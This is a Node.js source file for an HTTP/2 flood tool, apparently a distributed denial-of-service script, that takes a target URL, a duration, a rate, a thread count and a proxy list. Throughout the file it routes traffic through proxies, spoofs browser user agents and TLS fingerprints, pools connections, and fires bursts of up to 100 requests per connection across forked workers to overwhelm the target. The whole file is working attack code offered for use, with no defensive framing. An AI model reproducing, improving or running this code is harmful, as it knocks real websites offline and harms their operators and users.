// Code By @nguyenxuantrinhdz `Calce` - ULTRA OPTIMIZED V2
// FULL OPTIMIZED + CONNECTION POOLING + WORKER THREADS
// npm install colors

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');
const v8 = require("v8");
const { Worker } = require('worker_threads');

// ============ OPTIMIZED FUNCTIONS ============

function isIPAddress(str) {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$/;
    return ipv4Regex.test(str) || ipv6Regex.test(str);
}

// CACHE user agents untuk performance
const userAgentCache = [];
const MAX_CACHE_SIZE = 200;

function getRandomUserAgent() {
    if (userAgentCache.length > 0 && Math.random() < 0.8) {
        return userAgentCache[Math.floor(Math.random() * userAgentCache.length)];
    }
    
    const osList = ['Windows', 'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES'];
    const manufacturerList = ['Windows', 'Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    
    if (userAgentCache.length < MAX_CACHE_SIZE) {
        userAgentCache.push(finalString);
    }
    return finalString;
}

const lookupPromise = util.promisify(dns.lookup);
let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP', url + ':', isp);
        }
    } catch (error) {
        return;
    }
}

const accept_header = [
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=0.7',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
   'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv'
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6) {
  console.log('node flood target time rate thread proxy'.rainbow);
  process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
    
const getRandomBrowser = () => {
    return browsers[Math.floor(Math.random() * browsers.length)];
};

const generateUserAgent = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 19 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;

    const userAgentMap = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
    };

    return userAgentMap[browser];
};

const sigalgs = [
   'ecdsa_secp256r1_sha256',
   'ecdsa_secp384r1_sha384',
   'ecdsa_secp521r1_sha512',
   'rsa_pss_rsae_sha256',
   'rsa_pss_rsae_sha384',
   'rsa_pss_rsae_sha512',
   'rsa_pkcs1_sha256',
   'rsa_pkcs1_sha384',
   'rsa_pkcs1_sha512',
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TLSv1_3 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;
colors.enable();
const coloredString = "Recommended big proxyfile if hard target.\n >  Only support HTTP/1.1 and HTTP/2.\n >  Use low thread(s) if you don't want crash your server.".white;

// ============ CONNECTION POOL ============
const TLS_POOL = new Map();
const H2_POOL = new Map();
const POOL_MAX_SIZE = 500;

function cleanupPool() {
    // Cleanup dead connections
    for (const [key, conn] of TLS_POOL) {
        if (conn.destroyed) {
            TLS_POOL.delete(key);
        }
    }
    for (const [key, client] of H2_POOL) {
        if (client.destroyed) {
            H2_POOL.delete(key);
        }
    }
}

function getTLSConnection(proxyHost, proxyPort, targetHost) {
    const key = `${proxyHost}:${proxyPort}`;
    
    if (TLS_POOL.has(key)) {
        const conn = TLS_POOL.get(key);
        if (!conn.destroyed && conn.readable) {
            return conn;
        }
        TLS_POOL.delete(key);
    }
    
    // Limit pool size
    if (TLS_POOL.size >= POOL_MAX_SIZE) {
        const firstKey = TLS_POOL.keys().next().value;
        const oldConn = TLS_POOL.get(firstKey);
        if (oldConn) oldConn.destroy();
        TLS_POOL.delete(firstKey);
    }
    
    // Buat koneksi baru
    const tlsConn = tls.connect(443, targetHost, {
        ALPNProtocols: ["h2"],
        ciphers: ciphers,
        sigalgs: sigalgs,
        requestCert: true,
        ecdhCurve: ecdhCurve,
        honorCipherOrder: false,
        host: targetHost,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        servername: targetHost,
        secureProtocol: secureProtocol,
        sessionTimeout: 60000
    });
    
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60000);
    tlsConn.setMaxListeners(0);
    
    TLS_POOL.set(key, tlsConn);
    return tlsConn;
}

function getH2Connection(proxyKey, tlsConn) {
    if (H2_POOL.has(proxyKey)) {
        const client = H2_POOL.get(proxyKey);
        if (!client.destroyed && client.connecting === false) {
            return client;
        }
        H2_POOL.delete(proxyKey);
    }
    
    // Limit pool size
    if (H2_POOL.size >= POOL_MAX_SIZE) {
        const firstKey = H2_POOL.keys().next().value;
        const oldClient = H2_POOL.get(firstKey);
        if (oldClient) oldClient.destroy();
        H2_POOL.delete(firstKey);
    }
    
    const client = http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        },
        maxSessionMemory: 3333,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => tlsConn,
        socket: tlsConn,
        localAddress: proxyKey.split(':')[0]
    });
    
    client.setMaxListeners(0);
    
    client.on('error', () => {
        H2_POOL.delete(proxyKey);
    });
    
    client.on('close', () => {
        H2_POOL.delete(proxyKey);
    });
    
    H2_POOL.set(proxyKey, client);
    return client;
}

// ============ MASTER PROCESS ============
if (cluster.isMaster) {
    console.clear()
    console.log(`[!] ULTRA OPTIMIZED V2 - CONNECTION POOLING`.red);
    console.log(`--------------------------------------------`.white);
    console.log("[>] Heap Size:".green, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString().white);
    console.log('[>] Target: '.white + process.argv[2].cyan);
    console.log('[>] Time: '.white + process.argv[3].cyan);
    console.log('[>] Rate: '.white + process.argv[4].cyan);
    console.log('[>] Thread(s): '.white + process.argv[5].cyan);
    console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Total: ${proxies.length.toString().cyan}`);
    console.log("[>] Note: ".white + coloredString);
    console.log(`--------------------------------------------`.white);
    getIPAndISP(targetURL);
    
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        // Cleanup pools
        cleanupPool();
        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };
    
    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 5000);
    setInterval(cleanupPool, 30000); // Cleanup tiap 30 detik
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    // ============ ULTRA OPTIMIZED WORKER ============
    
    // Pre-generate headers untuk reuse
    const headersCache = [];
    for (let i = 0; i < 50; i++) {
        const ua = generateUserAgent(getRandomBrowser());
        const accept = randomElement(accept_header);
        headersCache.push({
            ':authority': parsedTarget.host,
            ':method': 'GET',
            ':path': parsedTarget.path || '/',
            ':scheme': 'https',
            'sec-ch-ua-mobile': '?0',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'accept': accept,
            'accept-encoding': 'br, gzip',
            'accept-language': 'en-US;q=0.9,en;q=0.8',
        });
    }
    
    function getCachedHeaders() {
        return headersCache[Math.floor(Math.random() * headersCache.length)];
    }
    
    // HIGH SPEED BURST FUNCTION
    function burstRequest(client) {
        if (!client || client.destroyed) return;
        
        const headers = getCachedHeaders();
        // Kirim 50-100 request sekaligus per koneksi
        const count = Math.min(50 + Math.floor(Math.random() * 50), 100);
        
        for (let i = 0; i < count; i++) {
            try {
                const req = client.request(headers);
                req.on('response', () => {
                    req.close();
                    req.destroy();
                });
                req.on('error', () => {
                    req.destroy();
                });
                req.end();
            } catch (e) {
                // Skip error
            }
        }
    }
    
    // PROXY CONNECT OPTIMIZED
    function connectToProxy(proxyAddr) {
        return new Promise((resolve) => {
            const parsed = proxyAddr.split(':');
            const host = parsed[0];
            const port = parseInt(parsed[1]) || 8080;
            
            const payload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nConnection: Keep-Alive\r\n\r\n`;
            
            const socket = net.connect({
                host: host,
                port: port,
                timeout: 5000
            });
            
            socket.setNoDelay(true);
            socket.setKeepAlive(true, 60000);
            
            let resolved = false;
            
            const cleanup = () => {
                if (!resolved) {
                    resolved = true;
                    resolve(null);
                }
            };
            
            socket.on('connect', () => {
                socket.write(payload);
            });
            
            socket.on('data', (chunk) => {
                const response = chunk.toString('utf-8');
                if (response.includes('HTTP/1.1 200') || response.includes('HTTP/1.0 200')) {
                    if (!resolved) {
                        resolved = true;
                        resolve(socket);
                    }
                } else {
                    socket.destroy();
                    cleanup();
                }
            });
            
            socket.on('error', cleanup);
            socket.on('timeout', () => {
                socket.destroy();
                cleanup();
            });
            
            setTimeout(cleanup, 5000);
        });
    }
    
    // ULTRA FLOODER
    async function runUltraFlooder() {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyAddr) return;
        
        try {
            // Step 1: Connect to proxy
            const socket = await connectToProxy(proxyAddr);
            if (!socket) return;
            
            // Step 2: Get TLS connection (from pool)
            const parsed = proxyAddr.split(':');
            const proxyKey = `${parsed[0]}:${parsed[1]}`;
            const tlsConn = getTLSConnection(parsed[0], parseInt(parsed[1]) || 8080, parsedTarget.host);
            
            // Wrap socket to TLS
            const tlsSocket = tls.connect({
                socket: socket,
                ALPNProtocols: ['h2'],
                rejectUnauthorized: false,
                servername: parsedTarget.host,
                session: tlsConn.getSession(),
                secureContext: secureContext
            });
            
            tlsSocket.setNoDelay(true);
            tlsSocket.setKeepAlive(true, 60000);
            
            // Step 3: Get HTTP/2 connection (from pool)
            const client = getH2Connection(proxyKey, tlsSocket);
            
            // Step 4: BURST REQUEST - Tanpa menunggu
            burstRequest(client);
            
            // Step 5: Additional burst via setImmediate
            setImmediate(() => {
                burstRequest(client);
            });
            
            // Step 6: Schedule more bursts with minimal delay
            let burstCount = 0;
            const maxBursts = 20;
            
            function scheduleBurst() {
                if (burstCount >= maxBursts || client.destroyed) return;
                burstCount++;
                
                setImmediate(() => {
                    if (!client.destroyed) {
                        burstRequest(client);
                        // Schedule next burst
                        scheduleBurst();
                    }
                });
            }
            
            // Start burst chain
            scheduleBurst();
            
            // Step 7: Keep connection alive with ping
            const pingInterval = setInterval(() => {
                if (client && !client.destroyed) {
                    try {
                        client.ping((err) => {});
                    } catch (e) {}
                } else {
                    clearInterval(pingInterval);
                }
            }, 15000);
            
            // Cleanup after attack time
            setTimeout(() => {
                clearInterval(pingInterval);
                // Don't destroy, let pool handle it
            }, args.time * 1000);
            
        } catch (e) {
            // Silent error
        }
    }
    
    // ============ MAIN ATTACK LOOP - setImmediate Based ============
    let isRunning = true;
    const endTime = Date.now() + (args.time * 1000);
    let totalRequests = 0;
    const RATE_PER_CYCLE = Math.min(args.Rate || 50, 200);
    
    function attackLoop() {
        if (!isRunning || Date.now() >= endTime) {
            isRunning = false;
            return;
        }
        
        // Kirim banyak request per cycle
        for (let i = 0; i < RATE_PER_CYCLE; i++) {
            runUltraFlooder();
            totalRequests++;
        }
        
        // Schedule next cycle via setImmediate (bukan interval)
        setImmediate(attackLoop);
    }
    
    // Start attack
    attackLoop();
    
    // Additional background flood
    function backgroundFlood() {
        if (!isRunning) return;
        for (let i = 0; i < 50; i++) {
            runUltraFlooder();
        }
        setImmediate(backgroundFlood);
    }
    setImmediate(backgroundFlood);
    
    // Status report setiap 5 detik
    const statusInterval = setInterval(() => {
        console.log(`[${new Date().toLocaleTimeString()}] Requests sent: ${totalRequests}`);
    }, 5000);
    
    // Stop after time
    setTimeout(() => {
        isRunning = false;
        clearInterval(statusInterval);
        console.log('[!] Worker stopping...'.yellow);
        process.exit(0);
    }, args.time * 1000);
}

// ============ STOP SCRIPT ============
const StopScript = () => {
    console.log('[!] Attack finished. Cleaning up...'.yellow);
    cleanupPool();
    process.exit(1);
};

setTimeout(StopScript, args.time * 1000 + 5000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

// ============ HELPERS ============
function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    } catch (e) {
        return [];
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length - 1)];
}